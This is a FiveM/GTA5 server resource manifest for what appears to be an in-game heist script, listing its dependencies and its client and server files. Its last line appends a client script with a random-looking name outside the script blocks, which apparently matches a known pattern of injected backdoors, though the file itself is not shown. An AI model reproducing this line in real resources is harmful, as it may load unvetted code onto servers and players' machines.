fx_version 'bodacious'
game 'gta5'

dependency 'essentialmode'
dependency 'essentialmode'
dependency 'esx_doorlock'
dependency 'esx_blowtorch'
dependency 'mhacking'
client_scripts {

	'@essentialmode/locale.lua',
	'locales/en.lua',
	'locales/es.lua',
	'config.lua',
	'client/client.lua'
}

server_scripts {
	'@essentialmode/locale.lua',
	'locales/en.lua',
	'locales/es.lua',
	'config.lua',
	'server/server.lua'
}
client_script "DISqkiIEcVydGenWnD.lua"